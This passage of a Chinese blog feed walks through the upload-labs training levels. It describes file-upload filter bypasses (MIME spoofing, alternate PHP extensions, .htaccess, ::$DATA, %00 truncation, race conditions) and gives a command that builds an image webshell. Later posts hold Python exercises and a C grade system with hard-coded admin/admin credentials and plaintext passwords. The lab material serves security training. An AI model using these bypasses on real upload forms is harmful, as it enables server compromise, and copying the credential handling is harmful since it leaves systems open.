class=""><p>找到文件上传的地址</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/5.png" class=""><p>在本地文件中添加地址</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/6.png" class=""><p>在本地进行上传</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/7.png" class=""><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p>这是一个白名单过滤，而且是MIME过滤，所谓的MIME过滤就是指对与请求包的Content-Type进行过滤，</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/8.png" class=""><p>将Content-Type改为图片的格式</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/9.png" class=""><p>成功上传。</p><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><p>这是一个黑名单过滤</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/10.png" class=""><p>尽管.php无法上传，但是我们可以使用.phtml  .php进行绕过。apache服务器能够使用php解析.phtml .php3</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/11.png" class=""><p>成功上传。</p><p>注：要在apache的httpd.conf中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析php5代码的，访问的时候就是一个空白页。</p><h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><p>通过后端的代码可以知道，这次过滤的东西很多，我们可以尝试上传一个.htaccess配置文件，将4.png图片当作php代码进行解析，首先创建一个.htaccess文件，里面写上代码。</p><h1 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h1><p>通过后端的代码我们可以看到，php对文件的过滤还是蛮严格的，但是我们仔细看一下可以发现它没有对.PHP的文件后缀名进行过滤因此本题有两种思路：</p><h2 id="第一种：-1"><a href="#第一种：-1" class="headerlink" title="第一种："></a>第一种：</h2><p>直接上传.PHP的文件。</p><h2 id="第二种：-1"><a href="#第二种：-1" class="headerlink" title="第二种："></a>第二种：</h2><p>通过代码我们可以整理出它后端过滤的流程，就是删到结尾的点后删除结尾的空格，这样我们完全可以将文件的后缀名改为.php. .这样经过它的删除之后我们仍有一个.php.的后缀名。这是我们还是可以正常访问的。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/12.png" class=""><h1 id="第六关："><a href="#第六关：" class="headerlink" title="第六关："></a>第六关：</h1><p>通过代码我们可以看出，后端对大小写进行了转换，将大写强制转换为小写，这时候我们上传.PHP文件的方法就不行了，但是我们仍然可以使用第四题的第二种方法。</p><h1 id="第七关："><a href="#第七关：" class="headerlink" title="第七关："></a>第七关：</h1><p>通过代码我们可以发现，后端没有对扩展名的. 进行过滤，所以我们可以通过将扩展名改为.php.的方式进行绕过。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/13.png" class=""><h1 id="第八关："><a href="#第八关：" class="headerlink" title="第八关："></a>第八关：</h1><p>这一关没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过：</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/14.png" class=""><h1 id="第九关："><a href="#第九关：" class="headerlink" title="第九关："></a>第九关：</h1><p>这个关过滤的思路就是会删去结尾的.将大写转换为小写然后删去结尾的空格。这个和第五关第二种方法是一样的。</p><h1 id="第十关："><a href="#第十关：" class="headerlink" title="第十关："></a>第十关：</h1><p>本题的过滤思路就是，后端会匹配黑名单里的内容将假如匹配到了黑名单里的内容则将文件的扩展名更改为空，但是它只是过滤一次所以我们可以采用双写进行绕过将文件扩展名改为.pphphp进行绕过。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/15.png" class=""><h1 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h1><p>本题是采用白名单，并且后端会将最后一个.之后的名字当作文件的扩展名，比如.   .php，它会将文件的扩展名当作.php来处理。并且会采用直接拼接的方式将它进行重命名。因此我们采用%00进行截断，</p><p>截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/16.png" class=""><h1 id="第十二关："><a href="#第十二关：" class="headerlink" title="第十二关："></a>第十二关：</h1><p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/17.png" class=""><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/18.png" class=""><h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关:"></a>第十三关:</h1><p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg /b + 1.php /a shell.jpg</span><br></pre></td></tr></table></figure><p>然后上传就行了，因为我这个版本问题，没有文件包含漏洞，所以无法测试。</p><h1 id="第十四关："><a href="#第十四关：" class="headerlink" title="第十四关："></a>第十四关：</h1><p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13。</p><h1 id="第十五关："><a href="#第十五关：" class="headerlink" title="第十五关："></a>第十五关：</h1><p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13。</p><h1 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h1><p>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，二次渲染简单的理解就是在你点上传之后服务器已经给你将文件上传出去了，但是图片会再进行一次过滤之类的，将图片重新复制一份并储存在一个新的文件地址之下，然后删除原来的文件，二次渲染可以通过条件竞争进行访问。具体的操作过程将在下一关讲解。</p><h1 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h1><p>本题是一个条件竞争的题，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/19.png" class=""><h1 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h1><p>本题也存在条件竞争的问题，根据提示的源码可能看不出有什么东西，但是通过查看本题完整的源代码可以看出这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p><h1 id="第十九关："><a href="#第十九关：" class="headerlink" title="第十九关："></a>第十九关：</h1><p>本关采用两种方法。</p><h2 id="第一种：-2"><a href="#第一种：-2" class="headerlink" title="第一种："></a>第一种：</h2><p>根据源码将名字伪造成一个文件夹，这样就可以成功的绕过。</p><img src="/2022/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0upload-labs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/20.png" class=""><h2 id="第二种：-2"><a href="#第二种：-2" class="headerlink" title="第二种："></a>第二种：</h2><p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python刷题记录</title>
      <link href="/2022/03/13/python%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/03/13/python%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>题目：有1、2、3、4个数字，能组成多少个互不相同且无重复数字的三位数？都是多少？</p><pre><code>cnt = 0for i in range(1,5):    for j in range(1,5):        for k in range(1,5):            if i!=j and i!=k and j!=k:                print (i*100+j*10+k)                cnt+=1print (cnt)</code></pre><hr><h2 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h2><p>题目：企业发放的奖金根据利润提成。利润(I)低于或等于10万元时，奖金可提10%；利润高于10万元，低于20万元时，低于10万元的部分按10%提成，高于10万元的部分，可可提成7.5%；20万到40万之间时，高于20万元的部分，可提成5%；40万到60万之间时高于40万元的部分，可提成3%；60万到100万之间时，高于60万元的部分，可提成1.5%，高于100万元时，超过100万元的部分按1%提成，从键盘输入当月利润I，求应发放奖金总数？</p><pre><code>i = int(input(&quot;请输入：&quot;))arr = [1000000, 600000, 400000, 200000, 100000, 0]rat = [0.01, 0.015, 0.03, 0.05, 0.075, 0.1]r = 0for n in range(0, 6):    if i &gt; arr[n]:        r += (i - arr[n]) * rat[n]print(r)</code></pre><hr><h2 id="第三题："><a href="#第三题：" class="headerlink" title="第三题："></a>第三题：</h2><p>题目：一个整数，它加上100后是一个完全平方数，再加上168又是一个完全平方数，请问该数是多少？</p><pre><code>import mathi = 0while True:    if math.sqrt(i + 100) - int(math.sqrt(i + 100)) == 0 and math.sqrt(i + 168) - int(math.sqrt(i + 168)) == 0:        print(i)        break    i += 1</code></pre><h2 id="第四题："><a href="#第四题：" class="headerlink" title="第四题："></a>第四题：</h2><p>题目：判断101-200之间有多少个素数，并输出所有素数。</p><pre><code>for i in range(101,201):    flag = 1    k = int(math.sqrt(i))    for j in range(2,k+1):        if i%j == 0:            flag = 0            break    if flag == 1:        print(i)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python小项目--名片信息管理系统</title>
      <link href="/2022/03/05/%E5%B0%8F%E9%A1%B9%E7%9B%AE-%E5%90%8D%E7%89%87%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/03/05/%E5%B0%8F%E9%A1%B9%E7%9B%AE-%E5%90%8D%E7%89%87%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="python-学习阶段性小项目–名片信息管理系统"><a href="#python-学习阶段性小项目–名片信息管理系统" class="headerlink" title="python 学习阶段性小项目–名片信息管理系统"></a>python 学习阶段性小项目–名片信息管理系统</h2><p>注：本系统未涉及到文件读取，保存</p><h2 id="cards-main-py"><a href="#cards-main-py" class="headerlink" title="cards_main.py"></a>cards_main.py</h2><pre><code>import cards_tools # 导入工具包while True:    cards_tools.show_menu()    action_str = input(&quot;请选择希望执行的操作：&quot;)    print(&quot;&quot;)    print(&quot;您选择的操作是【%s】&quot; % action_str)    if action_str in [&quot;1&quot;,&quot;2&quot;,&quot;3&quot;]:        # 新增名片        if action_str == &quot;1&quot;:            cards_tools.new_card()        # 显示全部        elif action_str == &quot;2&quot;:            cards_tools.show_all()        # 查询名片        elif action_str == &quot;3&quot;:            cards_tools.search_card()    elif action_str == &quot;0&quot;:        print(&quot;欢迎再次使用【名片信息管理系统】&quot;)        break    else:        print(&quot;您输入的不正确，请重新选择&quot;)</code></pre><h2 id="cards-tools-py"><a href="#cards-tools-py" class="headerlink" title="cards_tools.py"></a>cards_tools.py</h2><pre><code>import time# 记录所有的名片字典card_list = []def show_menu():    &quot;&quot;&quot;显示菜单&quot;&quot;&quot;    print(&quot;*&quot; * 50)    print(&quot;欢迎使用【名片信息管理系统】&quot;)    print(&quot;1.新增名片&quot;)    print(&quot;2.显示全部&quot;)    print(&quot;3.搜索名片&quot;)    print(&quot;\n&quot;)    print(&quot;0.退出系统&quot;)    print(&quot;*&quot; * 50)def new_card():    &quot;&quot;&quot;新增名片&quot;&quot;&quot;    print(&quot;-&quot; * 50)    print(&quot;新增名片&quot;)    # 提示用户输入名片的详细内容    name_str = input(&quot;请输入姓名：&quot;)    phone_str = input(&quot;请输入电话：&quot;)    qq_str = input(&quot;请输入QQ：&quot;)    email_str = input(&quot;请输入邮箱：&quot;)    # 使用用户输入的信息建立一个名片字典    card_dict = &#123;&quot;name&quot;:name_str,                &quot;phone&quot;:phone_str,                &quot;qq&quot;:qq_str,                &quot;email&quot;:email_str&#125;    # 将名片字典添加到列表中    card_list.append(card_dict)    # 提示用户添加成功    print(&quot;添加 %s 的名片成功 ！&quot; % name_str)    print(&quot;即将在3秒后返回上一界面&quot;)    time.sleep(3)def show_all():    &quot;&quot;&quot;显示所有名片&quot;&quot;&quot;    print(&quot;-&quot; * 50)    print(&quot;显示所有名片&quot;)    # 判断是否存在名片记录，如果没有，提示用户并且返回    if len(card_list) == 0:        print(&quot;当前没有任何名片记录，请使用新增功能添加名片 ！&quot;)        return    # 打印表头    for name in [&quot;姓名&quot;,&quot;电话&quot;,&quot;QQ&quot;,&quot;邮箱&quot;]:        print(name,end=&quot;\t\t\t&quot;)    print(&quot;&quot;)    print(&quot;=&quot; *50)    for card_dict in card_list:        print(&quot;%s\t\t%s\t\t%s\t\t%s&quot; % (card_dict[&quot;name&quot;],                                        card_dict[&quot;phone&quot;],                                        card_dict[&quot;qq&quot;],                                        card_dict[&quot;email&quot;]))def search_card():    &quot;&quot;&quot;搜索名片&quot;&quot;&quot;    print(&quot;-&quot; * 50)    print(&quot;搜索名片&quot;)    # 提示用户输入要搜索的姓名    find_name = input(&quot;请输入要搜索的姓名：&quot;)    #遍历列表，查询要搜索的姓名，如果没有找到，需要提示用户    for card_dict in card_list:        if card_dict[&quot;name&quot;] == find_name:            for name in [&quot;姓名&quot;, &quot;电话&quot;, &quot;QQ&quot;, &quot;邮箱&quot;]:                print(name, end=&quot;\t\t\t&quot;)            print(&quot;&quot;)            print(&quot;=&quot; * 50)            print(&quot;%s\t\t%s\t\t%s\t\t%s&quot; % (card_dict[&quot;name&quot;],                                            card_dict[&quot;phone&quot;],                                            card_dict[&quot;qq&quot;],                                            card_dict[&quot;email&quot;]))            deal_card(card_dict)            break    else:        print(&quot;抱歉，没有找到 %s&quot; % find_name)def deal_card(find_dict):    action_str = input(&quot;请选择要执行的操作 1： 修改 2： 删除 0： 返回上级界面&quot;)    if action_str == &quot;1&quot;:        find_dict[&quot;name&quot;] = input_card_info(find_dict[&quot;name&quot;],&quot;姓名：&quot;)        find_dict[&quot;phone&quot;] = input_card_info(find_dict[&quot;phone&quot;],&quot;电话：&quot;)        find_dict[&quot;qq&quot;] = input_card_info(find_dict[&quot;qq&quot;],&quot;QQ：&quot;)        find_dict[&quot;email&quot;] = input_card_info(find_dict[&quot;email&quot;],&quot;邮箱：&quot;)        print(&quot;修改名片成功&quot;)    elif action_str == &quot;2&quot;:        card_list.remove(find_dict)        print(&quot;删除名片成功&quot;)def input_card_info(dict_value,tip_message):    result_str = input(tip_message)    if len(result_str) &gt; 0:        return result_str    else:        return dict_value</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言小项目——学生成绩管理系统</title>
      <link href="/2022/03/03/C%E8%AF%AD%E8%A8%80%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E5%AD%A6%E7%94%9F%E6%88%90%E7%BB%A9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/03/03/C%E8%AF%AD%E8%A8%80%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E5%AD%A6%E7%94%9F%E6%88%90%E7%BB%A9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="stduent-h"><a href="#stduent-h" class="headerlink" title="stduent.h"></a>stduent.h</h2><pre><code>#ifndef STUDENT_H_INCLUDED#define STUDENT_H_INCLUDED#pragma once#pragma warning(disable:4996)//visual studio 支持c语言必备内容#define FILE_DATA_PATH &quot;E:\\STUDENT.txt&quot;//定义存放文件路径为STUDENT.txt文件#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include  &lt;string.h&gt;#include &lt;conio.h&gt;#define MAX 300//最大录入信息300人//学生信息结构体struct isStudent&#123;char name[9]; //姓名int number; // 默认学号8位float chinese;float math;float english; //定义三科成绩；float average; //定义平均成绩char password[20];//定义个人密码&#125;;typedef struct isStudent isStudent;static isStudent temporary[1];isStudent stu[MAX];//学生数量结构体int nowStudentNumber;//全局变量，代表当前学生人数//显示欢迎信息void welcome();//系统界面void memu();//学生系统界面void studentInterface(int studentnumber13);//管理员学生界面void adminInterface();//管理员增加学生信息void creatAccount();//删除学生信息void deleteAccount();//退出系统void exitSystem();//排序学生void sort();//按总成绩排序void sortGrade();//显示所有存储的信息void adminShow();//管理员查看个人信息void studentShow();//写入函数void writeIn();//查找单个信息//void searchPersonInformation_asNumber();//读取文件void readOut();//请求输入学生密码和账号void studentInPWD();//管理员密码登录void adminInPWD();//学生端查看个人信息void studentFindShow(int studentnumber);//学生端修改密码void changeTheSecurityCode(int studentNumber13);//管理员功能界面void adminMemu();#endif // STUDENT_H_INCLUDED</code></pre><h2 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h2><pre><code>#include &lt;stdio.h&gt;#include &quot;student.h&quot;int main()&#123;    int income;    welcome();//功能：欢迎界面    getch();    nowStudentNumber = 0;    readOut();//读取文件    while (1)    &#123;        system(&quot;cls&quot;);        memu();        scanf(&quot;%d&quot;, &amp;income);        getchar();        switch (income)        &#123;        case 1:            adminInPWD();//管理员端登录密码            break;        case 2:            studentInPWD();//学生端登录密码            break;        case 3:            printf(&quot;\t\t\t--------------------------谢谢使用！输入任意键继续--------------------------\n&quot;);            getchar();            return 0;        default:            ;        &#125;    &#125;&#125;</code></pre><h2 id="stduent-c"><a href="#stduent-c" class="headerlink" title="stduent.c"></a>stduent.c</h2><pre><code>/////运行支持库#include&lt;stdio.h&gt;#include &quot;Student.h&quot;#pragma warning(disable:4996)//visual studio 支持c语言必备内容//欢迎界面void welcome()&#123;    /*    printf(&quot;\n\n\n\n\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t*********************************\n&quot;);    printf(&quot;\t\t\t\t\t*                               *\n&quot;);    printf(&quot;\t\t\t\t\t*                               *\n&quot;);    printf(&quot;\t\t\t\t\t*   欢迎进入学生成绩管理系统    *\n&quot;);    printf(&quot;\t\t\t\t\t*                               *\n&quot;);    printf(&quot;\t\t\t\t\t*                               *\n&quot;);    printf(&quot;\t\t\t\t\t*********************************&quot;);    */printf(&quot;\n\n\n\n\n\n&quot;);    printf(&quot;\t\t\t\t   Welcome to the Student achievement management system\n&quot;);    printf(&quot;\t\t\t\t\t             ～ (((^^)(^^)))    \n&quot;);    printf(&quot;\t\t\t\t\t┌────────────────────────────────────┐\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│     欢迎进入学生成绩管理系统       │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t└────────────────────────────────────┘\n&quot;);&#125;//void memu()&#123;    printf(&quot;\n\n\n\n\n\n&quot;);    printf(&quot;\t\t\t\t   Welcome to the Student achievement management system\n&quot;);    printf(&quot;\t\t\t\t\t             ～ (((^^)(^^)))    \n&quot;);    printf(&quot;\t\t\t\t\t┌────────────────────────────────────┐\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│      1.管理员身份登陆!             │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│      2.本科生身份登陆!             │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│      3.退出系统!                   │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t└────────────────────────────────────┘\n&quot;);    printf(&quot;\t\t\t\t\t请输入对应的数字选择功能！&quot;);&#125;void adminMemu()&#123;/*        printf(&quot;\t\t\t\t\t\t-------------------------1.录入学生成绩-------------------------\n&quot;);        printf(&quot;\n&quot;);        printf(&quot;\t\t\t\t\t\t-------------------------2.查找学生信息-------------------------\n&quot;);        printf(&quot;\n&quot;);        printf(&quot;\t\t\t\t\t\t-------------------------3.删除学生信息-------------------------\n&quot;);        printf(&quot;\n&quot;);        printf(&quot;\t\t\t\t\t\t-------------------------4.按照总成绩排序-----------------------\n&quot;);        printf(&quot;\n&quot;);        printf(&quot;\t\t\t\t\t\t-------------------------5.按学号排序---------------------------\n&quot;);        printf(&quot;\n&quot;);        printf(&quot;\t\t\t\t\t\t-------------------------6.统计学生总数-------------------------\n&quot;);        printf(&quot;\n&quot;);        printf(&quot;\t\t\t\t\t\t-------------------------0.退出系统-----------------------------\n&quot;);        */    printf(&quot;\n\n\n\n\n\n&quot;);    printf(&quot;\t\t\t\t   Welcome to the Student achievement management system\n&quot;);    printf(&quot;\t\t\t\t\t             ～ (((^^)(^^)))    \n&quot;);    printf(&quot;\t\t\t\t\t┌────────────────────┸───────────────┐\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│      1.录入学生成绩                │\n&quot;);    printf(&quot;\t\t\t\t\t│      2.查找学生信息                │\n&quot;);    printf(&quot;\t\t\t\t\t│      3.删除学生信息                │\n&quot;);    printf(&quot;\t\t\t\t\t│      4.按照总成绩排序              │\n&quot;);    printf(&quot;\t\t\t\t\t│      5.按学号排序                  │\n&quot;);    printf(&quot;\t\t\t\t\t│      6.统计学生总数                │\n&quot;);    printf(&quot;\t\t\t\t\t│      0.退出系统                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t│                                    │\n&quot;);    printf(&quot;\t\t\t\t\t└────────────────────────────────────┘\n&quot;);    printf(&quot;\t\t\t\t\t请输入对应的数字选择功能！&quot;);&#125;//写入文件void writeIn()//写入文件&#123;    char ch;    FILE* pFile;    pFile = fopen(&quot;STUDENT.txt&quot;, &quot;w&quot;);//状态，覆写    if (pFile == NULL)    &#123;        printf(&quot;\t\t\t写入文件失败。\n&quot;);        printf(&quot;\t\t\t文件保存错误。\n&quot;);        printf(&quot;\t\t\t输入任意键退出。\n&quot;);        getch();        return 0;//以不正常状态退出    &#125;    else    &#123;        //将所有内容写入文件        for (int i = 0; i &lt; nowStudentNumber; i++)        &#123;            fprintf(pFile, &quot;%-9s %-10d %-6.f %-6.f %-6.f %-6.f %-22s\n&quot;, stu[i].name, stu[i].number, stu[i].chinese, stu[i].math, stu[i].english, stu[i].average, stu[i].password);        &#125;        fclose(pFile);        getchar();    &#125;&#125;//读取文件void readOut()//从文件读取&#123;    int i = 0;    FILE* pFile;    pFile = fopen(&quot;STUDENT.txt&quot;, &quot;r&quot;);//此处需要更换文件路径    if (pFile == NULL)    &#123;        printf(&quot;\t\t\t打开文件失败。\n&quot;);        return;    &#125;    else    &#123;        while (fscanf(pFile, &quot;%s %d %f %f %f %f %s\n&quot;, &amp;stu[i].name, &amp;stu[i].number, &amp;stu[i].chinese, &amp;stu[i].math, &amp;stu[i].english, &amp;stu[i].average, &amp;stu[i].password)!=EOF)//读取一组数据后指针指向下一组数据，并且判断是否指向最后一行        &#123;            //fscanf(pFile, &quot;%s %d %f %f %f %f %s\n&quot;, &amp;stu[i].name, &amp;stu[i].number, &amp;stu[i].chinese, &amp;stu[i].math, &amp;stu[i].english, &amp;stu[i].average, &amp;stu[i].password);            i++;        &#125;        nowStudentNumber = i;//此处为记录有多少条信息,后可改为宏变        i--;        fclose(pFile);                //关闭文件；    &#125;&#125;////管理员端接入//管理员界面void adminInterface()//.管理员界面&#123;    while (1)    &#123;loop2:       system(&quot;cls&quot;);        adminMemu();        int ch = 9;//读取选择        scanf(&quot;%d&quot;,&amp;ch);        getchar();        switch (ch)        &#123;        case 1://1. 录入学生成绩            creatAccount();            break;        case 2://2.查找学生信息            studentShow();//、            break;        case 3://3.删除学生信息            deleteAccount();            break;        case 4://4.按总成绩排序            sortGrade();//ChangeStudent();            break;        case 5://5.按照学号排序            sort();//RankStudent();            break;        case 6://6.统计学生总数            printf(&quot;\t&quot;);            printf(&quot;\t\t\t\t当前学生总数为：%d\n&quot;,nowStudentNumber);            printf(&quot;\t\t\t\t\t-----------按任意键返回菜单------------&quot;);            getch();            break;        case 0://退出系统            exit(0);        default:            ;        &#125;        //getchar();    &#125;    return 0;&#125;//管理员密码登录void adminInPWD()&#123;loop:    system(&quot;cls&quot;);    printf(&quot;\n\n\n\n\n\n&quot;);    printf(&quot;\t\t\t请输入管理员账号:&quot;);    char adminnumberin[20];    scanf(&quot;%s&quot;, adminnumberin);    char passwordin[20];//输入的密码    char admin[6] = &quot;admin&quot;;    if (strcmp(admin, adminnumberin) == 0)    &#123;loop1:        system(&quot;cls&quot;);        printf(&quot;\n\n\n\n\n\n&quot;);        printf(&quot;\t\t\t请输入密码:&quot;);        scanf(&quot;%s&quot;, passwordin);        if (strcmp(admin, passwordin) == 0)        &#123;            adminInterface();        &#125;        else        &#123;            printf(&quot;\n\n\n\n\n\n&quot;);            printf(&quot;\t\t\t密码输入错误！！&quot;);            sleep(1);        &#125;        goto loop1;    &#125;    else&#123;        printf(&quot;\n\n\n\n\n\n&quot;);        printf(&quot;\t\t\t账号输入错误！！&quot;);        sleep(1);        goto loop;    &#125;&#125;//管理员添加学生信息void creatAccount()&#123;    int i = nowStudentNumber;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t\t请输入学生学号:&quot;);    scanf(&quot;%d&quot;, &amp;temporary[i].number);    printf(&quot;\n\n\t\t\t\t\t\t请输入学生姓名:&quot;);    scanf(&quot;%s&quot;, &amp;temporary[i].name);    printf(&quot;\n\n\t\t\t\t\t\t请输入语文，数学，英语三科成绩\n&quot;);    printf(&quot;\t\t\t\t\t\t&quot;);    scanf(&quot;%f %f %f&quot;, &amp;temporary[i].chinese, &amp;temporary[i].math, &amp;temporary[i].english);    temporary[i].average = temporary[i].chinese + temporary[i].math + temporary[i].english;    strcpy(temporary[i].password, &quot;123456&quot;);    printf(&quot;\n\n\t\t\t\t\t\t学生的默认密码为123456!&quot;);    //strcpy(stu[nowStudentNumber], temporary[0]);    stu[i] = temporary[i];    nowStudentNumber = i + 1;    writeIn();    readOut();&#125;//管理员查询单个信息void studentShow()&#123;    readOut();    int flag, s;//此处变量用来接收查询的学号    char name[10];//此处用来接收查询的学生姓名    int flag1 = 0;//此处变量用来无法查询到学号时返回变量    int number;//此处接收用户个数    system(&quot;cls&quot;);    printf(&quot;\n\n\n\n&quot;);    printf(&quot;\t\t\t按照学号查询，请按“1”\n&quot;);    printf(&quot;\t\t\t按照姓名查询，请按“2”\n&quot;);    printf(&quot;\t\t\t返回上一菜单，请按“0”\n&quot;);    printf(&quot;\t\t\t请输入查询方式\n&quot;);//按照不同方式进行查询    printf(&quot;\t\t\t&quot;);    scanf(&quot;%d&quot;, &amp;flag);    if(0 == flag)    return ;    if (1 == flag)    &#123;        system(&quot;cls&quot;);        printf(&quot;\n\n\n\n&quot;);        printf(&quot;\t\t\t--------------------------请输入要查询的学号:--------------------------\n&quot;);        printf(&quot;\t\t\t&quot;);        scanf(&quot;%d&quot;, &amp;s);        number = nowStudentNumber;        for (int i = 0; i &lt; number; i++)        &#123;            if (stu[i].number == s)            &#123;        system(&quot;cls&quot;);                printf(&quot;\n\n\n&quot;);                printf(&quot;\t\t\t%-9s %-9s %-6s 